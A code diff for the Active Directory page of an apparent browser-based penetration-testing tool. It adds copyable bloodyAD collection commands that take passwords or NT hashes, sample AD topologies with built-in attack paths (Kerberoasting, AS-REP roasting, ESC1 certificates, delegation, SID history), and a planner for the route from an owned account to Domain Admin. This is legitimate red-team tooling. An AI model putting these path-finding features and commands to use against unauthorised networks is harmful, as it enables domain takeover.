+        cmd: "bloodyAD -d '" + dom + "' --host " + dc + " -u '" + user + "' " + (ctx.nt ? ("-p ':" + ctx.nt + "'") : ("-p '" + String(pw).replace(/'/g, "'\\''") + "'")) + ' get writable --detail'
+      }
+    ];
+
+    var rows = cmds.map(function (c) {
+      return '<div class="bh-acq-why">' + esc(c.label) + '</div>'
+        + '<div class="bh-cmd"><code>' + esc(c.cmd) + '</code><button class="btn-copy" data-copy="' + U.attr(c.cmd) + '">Copy</button></div>';
+    }).join('');
+
+    return '<details class="bh-detail bh-collect-guide"' + (hasSummary ? '' : ' open') + '>'
+      + '<summary>How to Collect BloodHound Data (1-Click Copy Commands)</summary>'
+      + '<div class="bh-acq">' + rows + '</div></details>';
+  }
+
+  // Three built-in sample AD topologies for learning, testing, and exploring the interactive graph
+  function getSamplePreset(presetId) {
+    var DOM1 = 'S-1-5-21-1111111111-2222222222-3333333333';
+    var DOM2 = 'S-1-5-21-4444444444-5555555555-6666666666';
+    if (presetId === 'forest') {
+      return {
+        owned: ['SVC_DEPLOY@CORP.LOCAL'],
+        data: {
+          domains: [
+            {
+              ObjectIdentifier: DOM1,
+              Properties: { name: 'CORP.LOCAL', domain: 'CORP.LOCAL', highvalue: true },
+              Trusts: [{ TargetDomainName: 'DEV.CORP.LOCAL', TargetDomainSid: DOM2, TrustDirection: 'Bidirectional', TrustType: 'ParentChild', IsTransitive: true, SidFilteringEnabled: false }],
+              Aces: [{ PrincipalSID: DOM1 + '-2102', PrincipalType: 'Group', RightName: 'WriteDacl', IsInherited: false }]
+            },
+            {
+              ObjectIdentifier: DOM2,
+              Properties: { name: 'DEV.CORP.LOCAL', domain: 'DEV.CORP.LOCAL', highvalue: true },
+              Trusts: [{ TargetDomainName: 'CORP.LOCAL', TargetDomainSid: DOM1, TrustDirection: 'Bidirectional', TrustType: 'ParentChild', IsTransitive: true, SidFilteringEnabled: false }],
+              Aces: []
+            }
+          ],
+          ous: [
+            {
+              ObjectIdentifier: 'OU-SERVERS-01',
+              Properties: { name: 'SERVERS_OU@CORP.LOCAL', domain: 'CORP.LOCAL' },
+              Links: [{ GUID: 'GPO-SERVERS-01', IsEnforced: false }],
+              ChildObjects: [{ ObjectIdentifier: DOM1 + '-1109', ObjectType: 'User' }]
+            }
+          ],
+          gpos: [
+            {
+              ObjectIdentifier: 'GPO-SERVERS-01',
+              Properties: { name: 'SERVER_POLICY_GPO@CORP.LOCAL', domain: 'CORP.LOCAL' },
+              Aces: [{ PrincipalSID: DOM1 + '-1101', PrincipalType: 'User', RightName: 'GenericWrite', IsInherited: false }]
+            }
+          ],
+          users: [
+            { ObjectIdentifier: DOM1 + '-500', Properties: { name: 'ADMIN@CORP.LOCAL', domain: 'CORP.LOCAL', enabled: true, highvalue: true } },
+            { ObjectIdentifier: DOM2 + '-500', Properties: { name: 'ADMIN@DEV.CORP.LOCAL', domain: 'DEV.CORP.LOCAL', enabled: true, highvalue: true }, HasSIDHistory: [{ ObjectIdentifier: DOM1 + '-519' }] },
+            { ObjectIdentifier: DOM1 + '-1101', Properties: { name: 'SVC_DEPLOY@CORP.LOCAL', domain: 'CORP.LOCAL', enabled: true } },
+            { ObjectIdentifier: DOM1 + '-1109', Properties: { name: 'BACKUP_ADM@CORP.LOCAL', domain: 'CORP.LOCAL', enabled: true }, Aces: [] },
+            { ObjectIdentifier: DOM2 + '-1201', Properties: { name: 'DEV_LEAD@DEV.CORP.LOCAL', domain: 'DEV.CORP.LOCAL', enabled: true, hasspn: true } }
+          ],
+          groups: [
+            {
+              ObjectIdentifier: DOM1 + '-512',
+              Properties: { name: 'DOMAIN ADMINS@CORP.LOCAL', domain: 'CORP.LOCAL', highvalue: true },
+              Members: [{ ObjectIdentifier: DOM1 + '-500', ObjectType: 'User' }, { ObjectIdentifier: DOM1 + '-1109', ObjectType: 'User' }]
+            },
+            {
+              ObjectIdentifier: DOM1 + '-519',
+              Properties: { name: 'ENTERPRISE ADMINS@CORP.LOCAL', domain: 'CORP.LOCAL', highvalue: true },
+              Members: [{ ObjectIdentifier: DOM1 + '-500', ObjectType: 'User' }]
+            },
+            {
+              ObjectIdentifier: DOM2 + '-512',
+              Properties: { name: 'DOMAIN ADMINS@DEV.CORP.LOCAL', domain: 'DEV.CORP.LOCAL', highvalue: true },
+              Members: [{ ObjectIdentifier: DOM2 + '-500', ObjectType: 'User' }, { ObjectIdentifier: DOM2 + '-1201', ObjectType: 'User' }]
+            },
+            {
+              ObjectIdentifier: DOM1 + '-2102',
+              Properties: { name: 'EXCHANGE WINDOWS PERMISSIONS@CORP.LOCAL', domain: 'CORP.LOCAL' },
+              Members: [{ ObjectIdentifier: DOM2 + '-1201', ObjectType: 'User' }]
+            }
+          ],
+          computers: [
+            { ObjectIdentifier: DOM1 + '-1001', Properties: { name: 'DC01.CORP.LOCAL', domain: 'CORP.LOCAL', enabled: true } },
+            { ObjectIdentifier: DOM2 + '-1001', Properties: { name: 'DEV-DC01.DEV.CORP.LOCAL', domain: 'DEV.CORP.LOCAL', enabled: true } }
+          ]
+        }
+      };
+    }
+    if (presetId === 'delegation') {
+      return {
+        owned: ['WEB_SVC@LAB.LOCAL'],
+        data: {
+          domains: [
+            { ObjectIdentifier: DOM1, Properties: { name: 'LAB.LOCAL', domain: 'LAB.LOCAL', highvalue: true }, Aces: [] }
+          ],
+          users: [
+            { ObjectIdentifier: DOM1 + '-500', Properties: { name: 'ADMINISTRATOR@LAB.LOCAL', domain: 'LAB.LOCAL', enabled: true, highvalue: true } },
+            { ObjectIdentifier: DOM1 + '-1101', Properties: { name: 'WEB_SVC@LAB.LOCAL', domain: 'LAB.LOCAL', enabled: true }, Aces: [] },
+            {
+              ObjectIdentifier: DOM1 + '-1102',
+              Properties: { name: 'GMSA_APP$@LAB.LOCAL', domain: 'LAB.LOCAL', enabled: true, gmsa: true },
+              Aces: [{ PrincipalSID: DOM1 + '-1101', PrincipalType: 'User', RightName: 'ReadGMSAPassword', IsInherited: false }]
+            },
+            {
+              ObjectIdentifier: DOM1 + '-1103',
+              Properties: { name: 'SQL_PROXY@LAB.LOCAL', domain: 'LAB.LOCAL', enabled: true, allowedtodelegate: ['cifs/DC01.LAB.LOCAL'] },
+              Aces: [{ PrincipalSID: DOM1 + '-1102', PrincipalType: 'User', RightName: 'ForceChangePassword', IsInherited: false }]
+            },
+            { ObjectIdentifier: DOM1 + '-1104', Properties: { name: 'DA_OPER@LAB.LOCAL', domain: 'LAB.LOCAL', enabled: true } }
+          ],
+          groups: [
+            {
+              ObjectIdentifier: DOM1 + '-512',
+              Properties: { name: 'DOMAIN ADMINS@LAB.LOCAL', domain: 'LAB.LOCAL', highvalue: true },
+              Members: [{ ObjectIdentifier: DOM1 + '-500', ObjectType: 'User' }, { ObjectIdentifier: DOM1 + '-1104', ObjectType: 'User' }]
+            }
+          ],
+          computers: [
+            {
+              ObjectIdentifier: DOM1 + '-1001',
+              Properties: { name: 'DC01.LAB.LOCAL', domain: 'LAB.LOCAL', enabled: true, unconstraineddelegation: true },
+              Sessions: { Collected: true, Results: [{ UserSID: DOM1 + '-500', ComputerSID: DOM1 + '-1001' }] }
+            },
+            {
+              ObjectIdentifier: DOM1 + '-1002',
+              Properties: { name: 'WS01.LAB.LOCAL', domain: 'LAB.LOCAL', enabled: true, haslaps: true },
+              LocalAdmins: { Collected: true, Results: [{ ObjectIdentifier: DOM1 + '-1102', ObjectType: 'User' }] },
+              AllowedToAct: { Collected: true, Results: [{ ObjectIdentifier: DOM1 + '-1101', ObjectType: 'User' }] },
+              Sessions: { Collected: true, Results: [{ UserSID: DOM1 + '-1104', ComputerSID: DOM1 + '-1002' }] }
+            }
+          ]
+        }
+      };
+    }
+    // Default 'single': Single-Domain ACL, Kerberoast, AS-REP & AD CS
+    return {
+      owned: ['SVC_ALFRESCO@CORP.LOCAL'],
+      data: {
+        domains: [
+          {
+            ObjectIdentifier: DOM1,
+            Properties: { name: 'CORP.LOCAL', domain: 'CORP.LOCAL', highvalue: true },
+            Aces: [
+              { PrincipalSID: DOM1 + '-2102', PrincipalType: 'Group', RightName: 'WriteDacl', IsInherited: false }
+            ]
+          }
+        ],
+        users: [
+          { ObjectIdentifier: DOM1 + '-500', Properties: { name: 'ADMINISTRATOR@CORP.LOCAL', domain: 'CORP.LOCAL', enabled: true, highvalue: true } },
+          { ObjectIdentifier: DOM1 + '-1101', Properties: { name: 'SVC_ALFRESCO@CORP.LOCAL', domain: 'CORP.LOCAL', enabled: true, dontreqpreauth: true } },
+          { ObjectIdentifier: DOM1 + '-1102', Properties: { name: 'SQLSVC@CORP.LOCAL', domain: 'CORP.LOCAL', enabled: true, hasspn: true } },
+          { ObjectIdentifier: DOM1 + '-1103', Properties: { name: 'HELPDESK@CORP.LOCAL', domain: 'CORP.LOCAL', enabled: true, passwordnotreqd: true } }
+        ],
+        groups: [
+          {
+            ObjectIdentifier: DOM1 + '-512',
+            Properties: { name: 'DOMAIN ADMINS@CORP.LOCAL', domain: 'CORP.LOCAL', highvalue: true },
+            Members: [{ ObjectIdentifier: DOM1 + '-500', ObjectType: 'User' }]
+          },
+          {
+            ObjectIdentifier: DOM1 + '-2101',
+            Properties: { name: 'ACCOUNT OPERATORS@CORP.LOCAL', domain: 'CORP.LOCAL' },
+            Members: [{ ObjectIdentifier: DOM1 + '-1101', ObjectType: 'User' }]
+          },
+          {
+            ObjectIdentifier: DOM1 + '-2102',
+            Properties: { name: 'EXCHANGE WINDOWS PERMISSIONS@CORP.LOCAL', domain: 'CORP.LOCAL' },
+            Members: [],
+            Aces: [
+              { PrincipalSID: DOM1 + '-2101', PrincipalType: 'Group', RightName: 'GenericAll', IsInherited: false },
+              { PrincipalSID: DOM1 + '-1102', PrincipalType: 'User', RightName: 'AddSelf', IsInherited: false }
+            ]
+          }
+        ],
+        computers: [
+          {
+            ObjectIdentifier: DOM1 + '-1001',
+            Properties: { name: 'DC01.CORP.LOCAL', domain: 'CORP.LOCAL', enabled: true, unconstraineddelegation: true },
+            LocalAdmins: { Collected: true, Results: [{ ObjectIdentifier: DOM1 + '-513', ObjectType: 'Group' }] }
+          }
+        ],
+        certtemplates: [
+          {
+            ObjectIdentifier: 'CERT-ESC1-01',
+            Properties: { name: 'CorpUserESC1', enabled: true, enrolleesuppliessubject: true, authenticationenabled: true }
+          }
+        ]
+      }
+    };
+  }
+
+  function loadSamplePreset(presetId) {
+    var preset = getSamplePreset(presetId);
+    var summary = OBOL.bloodhound.ingestObjects(preset.data);
+    summary.ownedExtra = preset.owned.slice();
+    var owned = ownedFromEngagement().concat(preset.owned);
+    var paths = OBOL.bloodhound.ownedPaths(summary, owned);
+    var facts = OBOL.bloodhound.toFacts(summary, paths, 'domain:' + (summary.domain || 'domain'));
+    OBOL.store.update(function (eng) {
+      eng.bloodhound = summary;
+      if (Array.isArray(eng.facts)) {
+        eng.facts = eng.facts.filter(function (f) { return !f || !/^bloodhound/i.test(String(f.source || '')); });
+      }
+    }, 'bloodhound-preset');
+    OBOL.store.addFacts(facts, 'bloodhound-preset');
+    if (OBOL.app && OBOL.app.renderSidebar) OBOL.app.renderSidebar();
+    if (U && U.toast) U.toast('Loaded sample AD topology: ' + (summary.domains && summary.domains.length > 1 ? summary.domains.join(' + ') : summary.domain));
+    OBOL.router.render();
+  }
+
+  function samplePresetsHtml(hasSummary) {
+    return '<div class="bh-presets">'
+      + '<span class="bh-leg-title">Explore Sample AD Topologies:</span> '
+      + '<button type="button" class="btn-ghost" data-bh-preset="single">1. Single-Domain ACL &amp; Roasting</button> '
+      + '<button type="button" class="btn-ghost" data-bh-preset="forest">2. Multi-Domain Forest, Trusts &amp; GPO</button> '
+      + '<button type="button" class="btn-ghost" data-bh-preset="delegation">3. Delegation, RBCD, gMSA &amp; Sessions</button>'
+      + (hasSummary ? ' <button type="button" class="btn-ghost" id="bh-clear">Clear Collection</button>' : '')
+      + '</div>';
+  }
+
   function render() {
     var eng = OBOL.store.active();
     var engId = (eng && eng.id) || null;
@@ -397,25 +773,26 @@
     var html = '<section class="domain-route">'
       + '<h1 class="route-h1">Domain (BloodHound)</h1>'
       + '<p class="route-sub">Upload a SharpHound <code>.zip</code> (or BloodHound-CE <code>.json</code> files). Everything is parsed and analysed in your browser, nothing is uploaded anywhere.</p>'
+      + liveAdFactsHtml()
       + '<div class="bh-drop" id="bh-drop" tabindex="0" role="button">Drop a SharpHound .zip here, or click to choose files'
       + '<input type="file" id="bh-file" accept=".zip,.json" multiple hidden></div>'
+      + samplePresetsHtml(!!summary)
+      + collectionGuideHtml(!!summary)
       + '<div id="bh-status" class="route-sub"></div>';
 
     if (summary) {
       var realOwned = ownedFromEngagement();
-      var owned = effectiveOwned();   // real + what-if; drives every derivation on the tab
-      var ownedUpper = {}; owned.forEach(function (o) { ownedUpper[shortName(o).toUpperCase()] = 1; });
-      var realUpper = {}; realOwned.forEach(function (o) { realUpper[shortName(o).toUpperCase()] = 1; });
+      var owned = effectiveOwned();
+      var ownedUpper = {}; owned.forEach(function (o) { ownedUpper[shortName(o).toUpperCase()] = 1; ownedUpper[String(o).toUpperCase()] = 1; });
+      var realUpper = {}; realOwned.forEach(function (o) { realUpper[shortName(o).toUpperCase()] = 1; realUpper[String(o).toUpperCase()] = 1; });
       var whatIfN = whatIfList().length;
       var view = OBOL.bloodhound.domainView(summary, owned, cmdCtx(owned, true));
 
-      // Inspect dropdown: every principal, ranked by closeness to Domain Admin, so you can select any
-      // account (owned or not) and see its paths. Owned accounts are marked; non-owned ones keep their
-      // commands gated until you own them. This is the "select a user and see their paths" control.
       var plist = OBOL.bloodhound.principalList(summary, { types: ['users', 'groups', 'computers'] });
       var opts = '<option value="">Select an account to inspect...</option>' + plist.map(function (p) {
         var up = p.short.toUpperCase();
-        var mk = realUpper[up] ? ' (owned)' : (_whatIf[up] ? ' (what-if)' : '');
+        var fullUp = String(p.name || '').toUpperCase();
+        var mk = (realUpper[fullUp] || realUpper[up]) ? ' (owned)' : ((_whatIf[fullUp] || _whatIf[up]) ? ' (what-if)' : '');
         var hop = (p.hops != null)
           ? (p.hops === 0 ? ' \u00b7 Domain Admin goal' : (' \u00b7 ' + p.hops + ' hop' + (p.hops === 1 ? '' : 's') + ' to DA'))
           : ' \u00b7 no path to DA';
@@ -424,7 +801,10 @@
 
       var uCount = typeof summary.users === 'number' ? summary.users : (summary.users ? summary.users.length : 0);
       var cCount = typeof summary.computers === 'number' ? summary.computers : (summary.computers || []).length;
-      html += '<div class="bh-summary-head"><h2 class="coach-sec-h">' + esc(summary.domain || 'domain')
+      var domDisplay = (summary.domains && summary.domains.length > 1)
+        ? (summary.domains.join(' + ') + ' (' + summary.domains.length + ' domains)')
+        : (summary.domain || 'domain');
+      html += '<div class="bh-summary-head"><h2 class="coach-sec-h">' + esc(domDisplay)
         + ': ' + uCount + ' users, ' + cCount + ' computers'
         + (realOwned.length ? ('<span class="bh-owned-count">' + realOwned.length + ' owned</span>') : '')
         + (whatIfN ? ('<span class="bh-owned-count whatif">' + whatIfN + ' what-if</span>') : '') + '</h2>'
@@ -432,8 +812,6 @@
         + '<button id="bh-report" class="btn-primary">Open Report</button></div></div>'
         + '<div id="bh-inspect-slot" class="bh-inspect-slot"></div>';
 
-      // What-If banner: when a hypothetical owned set is in play, the whole tab reflects it. Say so,
-      // and offer to commit the ones you really took to the engagement, or clear the sandbox.
       if (whatIfN) {
         var wiAll = whatIfList();
         var deadWi = wiAll.filter(function (w) {
@@ -449,42 +827,36 @@
           + '<button id="bh-whatif-clear" class="btn-ghost">Clear What-If</button></div>';
       }
 
-      // What Changed Since Last Collection: the temporal diff from the prior upload (if any).
       html += diffHtml(summary.diff);
 
-      // Bridge: this data became the coach's next moves. Tells the user where the "do this" lives.
       var q = coachQueued();
       if (q.top) {
         var fast = (summary.diff && summary.diff.route) ? true : false;
         html += '<a class="bh-bridge' + (fast ? ' fast' : '') + '" href="#/path">'
           + '<span class="bh-bridge-k">' + (fast ? 'A faster route to Domain Admin opened. ' : '') + 'OBOL turned this graph into your next moves.</span> '
           + '<span class="bh-bridge-top">Next up: ' + esc(q.top.title) + '</span>'
-          + '<span class="bh-bridge-go">Open Next Steps →</span></a>';
+          + '<span class="bh-bridge-go">Open Cockpit \u2192</span></a>';
       }
 
-      // Route to Domain Admin: the derived owned->DA path as numbered steps with the command per hop.
       html += '<div id="bh-route-slot">' + routeStepsHtml(view, owned, summary, cmdCtx(owned, true)) + '</div>';
 
-      // Interactive attack-path graph.
       html += '<h2 class="coach-sec-h">Attack-path graph</h2>'
         + '<div id="bh-graph" class="bh-graph-host">'
-        + (owned.length ? '' : '<div class="coach-empty">Own an account (a credential, or tick "I Own This" on an inspected account) to derive and graph owned→Domain-Admin paths.</div>')
+        + (owned.length ? '' : '<div class="coach-empty">Own an account (a credential, or tick "I Own This" on an inspected account) to derive and graph owned->Domain-Admin paths.</div>')
         + '</div>';
 
-      // Best Accounts To Hunt Next: the marginal-value board (who to go get to land closest to DA).
       html += huntHtml(summary, owned, cmdCtx(owned, true));
 
-      // Targeting board: who is closest to Domain Admin. Click a row to inspect that account. The whole
-      // list is available behind "+ N more" so you can explore all the data, not just the top 12.
       var near = (OBOL.bloodhound.nearestToGoal(summary) || []).filter(function (r) { return /user|group|computer/.test(r.type); });
       if (near.length) {
         function browHtml(r) {
-          var isOwn = ownedUpper[shortName(r.name).toUpperCase()];
+          var isOwn = ownedUpper[String(r.name).toUpperCase()] || ownedUpper[shortName(r.name).toUpperCase()];
+          var disp = (summary.domains && summary.domains.length > 1) ? r.name : shortName(r.name);
           return '<button class="bh-brow' + (isOwn ? ' owned' : '') + '" data-explore="' + U.attr(r.name) + '"><span class="bh-bhops">' + r.hops + ' hop' + (r.hops === 1 ? '' : 's') + '</span>'
-            + '<span class="bh-btype">' + esc(r.type) + '</span><span class="bh-bname">' + esc(shortName(r.name)) + (isOwn ? ' <span class="bh-tag own">owned</span>' : '') + '</span></button>';
+            + '<span class="bh-btype">' + esc(r.type) + '</span><span class="bh-bname">' + esc(disp) + (isOwn ? ' <span class="bh-tag own">owned</span>' : '') + '</span></button>';
         }
         html += '<h2 class="coach-sec-h">Closest To Domain Admin</h2>'
-          + '<p class="route-sub">Fewest hops to Domain Admin, who to go after next. Click a row to inspect that account’s paths and what it controls.</p>'
+          + '<p class="route-sub">Fewest hops to Domain Admin, who to go after next. Click a row to inspect that account\'s paths and what it controls.</p>'
           + '<div class="bh-board">' + near.slice(0, 12).map(browHtml).join('') + '</div>';
         if (near.length > 12) {
           html += '<div class="bh-board bh-more" hidden>' + near.slice(12).map(browHtml).join('') + '</div>'
@@ -492,11 +864,12 @@
         }
       }
 
-      // High-value queries: matched cards first, the empty ones collapsed so the signal is up top.
       function cardHtml(s) {
         var items = s.items || s.principals || [];
         var n = items.length || s.count || 0;
-        var cls = /admin|dcsync|unconstrained|domain admin|enterprise/i.test(s.title) ? 'crit' : (/kerberoast|as-?rep|roast/i.test(s.title) ? 'warn' : '');
+        var cls = /admin|dcsync|unconstrained|constrained|rbcd|gpo|sid history|domain admin|enterprise/i.test(s.title)
+          ? 'crit'
+          : (/kerberoast|as-?rep|roast|trust|gmsa|laps/i.test(s.title) ? 'warn' : '');
         var free = /as-?rep|password not required/i.test(s.title);
         var cmds = (s.commands || []).slice(0, 3).map(function (c) {
           var line = typeof c === 'string' ? c : (c.run || c.cmd || c.command || '');
@@ -505,8 +878,9 @@
         var detail = items.length
           ? '<details class="bh-detail"><summary>' + items.length + ' ' + (items.length === 1 ? 'match' : 'matches') + '</summary>'
             + '<ul class="bh-princ">' + items.map(function (p) {
-                var owns = ownedUpper[shortName(p).toUpperCase()];
-                return '<li><button class="bh-princ-x" data-explore="' + U.attr(p) + '">' + esc(p) + '</button>'
+                var exploreTarget = String(p).split(' -> ')[0].split(' \u2192 ')[0].split(' -[')[0].split(' @ ')[0].trim();
+                var owns = ownedUpper[exploreTarget.toUpperCase()] || ownedUpper[shortName(exploreTarget).toUpperCase()];
+                return '<li><button class="bh-princ-x" data-explore="' + U.attr(exploreTarget) + '">' + esc(p) + '</button>'
                   + (owns ? ' <span class="bh-tag own">owned</span>' : '') + '</li>';
               }).join('') + '</ul></details>'
           : '';
@@ -542,23 +916,16 @@
 
   async function ingest(fileList) {
     var status = document.getElementById('bh-status');
-    if (status) status.textContent = 'Parsing ' + fileList.length + ' file(s) in your browser…';
+    if (status) status.textContent = 'Parsing ' + fileList.length + ' file(s) in your browser...';
     var files = (await Promise.all(Array.prototype.map.call(fileList, readFile))).filter(Boolean);
     try {
       var prevSummary = (OBOL.store.active() || {}).bloodhound;
-      // Diff this upload against the previous collection (if any) over its retained graph, so the
-      // tab can show what new leverage opened. Carry the manually-asserted owned set forward so
-      // re-collecting does not drop the accounts you had already ticked as owned.
       var prevFp = (prevSummary && prevSummary._graph) ? OBOL.bloodhound.graphFingerprint(prevSummary) : null;
       var summary = await OBOL.bloodhound.parse(files);
       summary.diff = prevFp ? OBOL.bloodhound.diffCollections(prevFp, OBOL.bloodhound.graphFingerprint(summary)) : null;
       summary.ownedExtra = (prevSummary && prevSummary.ownedExtra) || [];
       var owned = ownedFromEngagement();
       var paths = OBOL.bloodhound.ownedPaths(summary, owned);
-      // Did this collection OPEN A FASTER ROUTE to Domain Admin for the accounts you own? (A re-collect
-      // after a foothold often does.) Compare the shortest owned->DA length now vs in the prior graph;
-      // if it shrank (or a route appeared where there was none), note it so the bridge can say so. The
-      // coach already re-ranks on the new ad.attack_paths fact; this is the visible "it got faster" cue.
       if (summary.diff && owned.length) {
         var nowLen = (paths.paths && paths.paths[0]) ? paths.paths[0].length : 0;
         var prevLen = (prevSummary && prevSummary._graph)
@@ -566,10 +933,12 @@
         if (nowLen && (!prevLen || nowLen < prevLen)) summary.diff.route = { now: nowLen, prev: prevLen || null };
       }
       var facts = OBOL.bloodhound.toFacts(summary, paths, 'domain:' + (summary.domain || 'domain'));
-      // Keep the transient _graph on the persisted summary so the interactive graph + census can
-      // be re-derived (and owned-principal recompute works) after reload - obol drops it only
-      // because its server keeps a lean SQLite store; the browser's IndexedDB can hold it.
-      OBOL.store.update(function (eng) { eng.bloodhound = summary; }, 'bloodhound');
+      OBOL.store.update(function (eng) {
+        eng.bloodhound = summary;
+        if (Array.isArray(eng.facts)) {
+          eng.facts = eng.facts.filter(function (f) { return !f || !/^bloodhound/i.test(String(f.source || '')); });
+        }
+      }, 'bloodhound');
       OBOL.store.addFacts(facts, 'bloodhound');
       OBOL.app.renderSidebar();
       var changeNote = (summary.diff && summary.diff.changed) ? ', changes since last collection' : '';
@@ -582,7 +951,7 @@
   }
 
   function mounted(ctx) {
-    var mount = (ctx && ctx.mount) || document;   // was referenced below but never defined: copy/report wiring silently threw
+    var mount = (ctx && ctx.mount) || document;
     var drop = document.getElementById('bh-drop');
     var input = document.getElementById('bh-file');
     if (drop && input) {
@@ -593,7 +962,7 @@
       ['dragleave', 'drop'].forEach(function (ev) { drop.addEventListener(ev, function (e) { e.preventDefault(); drop.classList.remove('drag'); }); });
       drop.addEventListener('drop', function (e) { if (e.dataTransfer && e.dataTransfer.files.length) ingest(e.dataTransfer.files); });
     }
-    // render the interactive attack-path graph (including any currently inspected principal)
+
     function renderGraph() {
       var eng0 = OBOL.store.active();
       if (!eng0 || !eng0.bloodhound || !OBOL.bhgraph) return;
@@ -603,6 +972,7 @@
       if (_inspecting) {
         var inspKey = shortName(_inspecting).toUpperCase();
         inspectedSet[inspKey] = 1;
+        inspectedSet[String(_inspecting).toUpperCase()] = 1;
         if (!owned0.some(function (o) { return shortName(o).toUpperCase() === inspKey; })) {
           graphPrincipals.push(_inspecting);
         }
@@ -611,11 +981,18 @@
       var host = document.getElementById('bh-graph');
       var g = view0.analysis && view0.analysis.graph;
       if (host && g && g.nodes && g.nodes.length) {
-        var ownedSet = {}; owned0.forEach(function (o) { ownedSet[shortName(o).toUpperCase()] = 1; });
+        var ownedSet = {};
+        owned0.forEach(function (o) {
+          ownedSet[shortName(o).toUpperCase()] = 1;
+          ownedSet[String(o).toUpperCase()] = 1;
+        });
         var reachedSet = {};
         owned0.forEach(function (o) {
           var c = OBOL.bloodhound.controls(eng0.bloodhound, o) || { controls: [] };
-          (c.controls || []).forEach(function (x) { reachedSet[shortName(x.name).toUpperCase()] = 1; });
+          (c.controls || []).forEach(function (x) {
+            reachedSet[shortName(x.name).toUpperCase()] = 1;
+            reachedSet[String(x.name).toUpperCase()] = 1;
+          });
         });
         OBOL.bhgraph.renderInto(host, g, {
           onNodeClick: function (id) { doInspect(id, true); },
@@ -630,21 +1007,39 @@
       }
     }
     renderGraph();
-    // copy buttons on the query cards
+
     U.on(mount, 'click', '.btn-copy', function (e, b) {
       var v = b.getAttribute('data-copy'); if (v) U.copy(v).then(function (ok) { U.toast(ok ? 'Copied' : 'Copy failed', ok ? '' : 'err'); });
     });
 
-    // Inspect an account: the dropdown, a targeting-board row, a census principal, a diff name, or a
-    // controlled-object link all compute that principal's tags, paths to DA, controls, and either its
-    // walk commands (if owned) or how to acquire it + the ownership gate (if not). Theorize or target
-    // from any account, not only the creds you hold. _inspecting survives a re-render (checkbox toggle).
+    U.on(mount, 'click', '[data-bh-preset]', function (e, b) {
+      e.preventDefault();
+      var pid = b.getAttribute('data-bh-preset');
+      if (pid) loadSamplePreset(pid);
+    });
+
+    var clearBtn = document.getElementById('bh-clear');
+    if (clearBtn) clearBtn.addEventListener('click', function () {
+      _whatIf = {};
+      _inspecting = null;
+      OBOL.store.update(function (eng) {
+        delete eng.bloodhound;
+        if (Array.isArray(eng.facts)) {
+          eng.facts = eng.facts.filter(function (f) { return !f || !/^bloodhound/i.test(String(f.source || '')); });
+        }
+      }, 'bloodhound-clear');
+      U.toast('Cleared BloodHound collection');
+      OBOL.router.render();
+    });
+
     function doInspect(principal, skipGraphRender) {
       var eng = OBOL.store.active(), slot = document.getElementById('bh-inspect-slot');
       if (!eng || !eng.bloodhound || !slot || !principal) return;
       _inspecting = principal;
       var owned = ownedFromEngagement();
-      slot.innerHTML = inspectHtml(principal, eng.bloodhound, owned, cmdCtxFor(principal));
+      var isOwn = isOwnedPrincipal(principal, owned) || isWhatIf(principal);
+      var inspectCtx = isOwn ? cmdCtxFor(principal) : cmdCtx(owned, true);
+      slot.innerHTML = inspectHtml(principal, eng.bloodhound, owned, inspectCtx);
       var sel = document.getElementById('bh-inspect');
       if (sel && sel.value !== principal) {
         try {
@@ -668,14 +1063,15 @@
       doInspect(v);
     });
 
-    // "I Own This Account Now" (door one of three): add/remove the principal in eng.bloodhound.ownedExtra,
-    // re-render so the whole tab (route, graph, gating) reflects the new owned set, then restore the card.
     U.on(mount, 'change', '.bh-own-check', function (e, c) {
       var who = c.getAttribute('data-own'); if (!who) return;
-      var on = c.checked, key = String(who).split('@')[0].toUpperCase();
+      var on = c.checked, key = String(who).toUpperCase(), shKey = shortName(who).toUpperCase();
       OBOL.store.update(function (eng) {
         eng.bloodhound = eng.bloodhound || {};
-        var set = (eng.bloodhound.ownedExtra || []).filter(function (x) { return String(x).split('@')[0].toUpperCase() !== key; });
+        var set = (eng.bloodhound.ownedExtra || []).filter(function (x) {
+          var xUp = String(x).toUpperCase();
+          return xUp !== key && shortName(x).toUpperCase() !== shKey;
+        });
         if (on) set.push(who);
         eng.bloodhound.ownedExtra = set;
       }, 'bloodhound-owned');
@@ -683,7 +1079,6 @@
       OBOL.router.render();
     });
 
-    // "+ N more" reveals the hidden sibling list/board and drops the button.
     U.on(mount, 'click', '.bh-more-btn', function (e, b) {
       var more = b.previousElementSibling;
       while (more && !(more.classList && more.classList.contains('bh-more'))) more = more.previousElementSibling;
@@ -691,17 +1086,16 @@
       b.remove();
     });
 
-    // What-If sandbox: add/remove a hypothetical owned account (ephemeral, never touches the engagement),
-    // re-render so the whole tab reflects it, and restore the inspect card. Commit moves the hypotheticals
-    // into the real owned set; Clear discards them.
     U.on(mount, 'click', '[data-whatif-add]', function (e, b) {
       var who = b.getAttribute('data-whatif-add'); if (!who) return;
+      _whatIf[String(who).toUpperCase()] = who;
       _whatIf[shortName(who).toUpperCase()] = who;
       U.toast('What-If: added ' + shortName(who));
       OBOL.router.render();
     });
     U.on(mount, 'click', '[data-whatif-remove]', function (e, b) {
       var who = b.getAttribute('data-whatif-remove'); if (!who) return;
+      delete _whatIf[String(who).toUpperCase()];
       delete _whatIf[shortName(who).toUpperCase()];
       U.toast('What-If: removed ' + shortName(who));
       OBOL.router.render();
@@ -713,7 +1107,7 @@
         eng.bloodhound = eng.bloodhound || {};
         var set = eng.bloodhound.ownedExtra || [];
         var have = {}; set.forEach(function (x) { have[shortName(x).toUpperCase()] = 1; });
-        list.forEach(function (w) { if (!have[shortName(w).toUpperCase()]) set.push(w); });
+        list.forEach(function (w) { if (!have[shortName(w).toUpperCase()]) { have[shortName(w).toUpperCase()] = 1; set.push(w); } });
         eng.bloodhound.ownedExtra = set;
       }, 'bloodhound-owned');
       _whatIf = {};
@@ -736,7 +1130,6 @@
       if (frame) frame.srcdoc = htmlDoc;
     });
 
-    // Restore the inspect card after a re-render (e.g. ticking "I Own This"), if it still exists.
     if (_inspecting && document.getElementById('bh-inspect-slot')) {
       var still = OBOL.bloodhound.principalList((OBOL.store.active() || {}).bloodhound || {}, {})
         .some(function (p) { return shortName(p.name).toUpperCase() === shortName(_inspecting).toUpperCase(); });
@@ -745,5 +1138,5 @@
   }
 
   OBOL.routes = OBOL.routes || {};
-  OBOL.routes.domain = { render: render, mounted: mounted };
+  OBOL.routes.domain = { render: render, mounted: mounted, hopCommand: hopCommand, pathCommandChain: pathCommandChain, getSamplePreset: getSamplePreset };
 })(typeof globalThis !== 'undefined' ? globalThis : this);
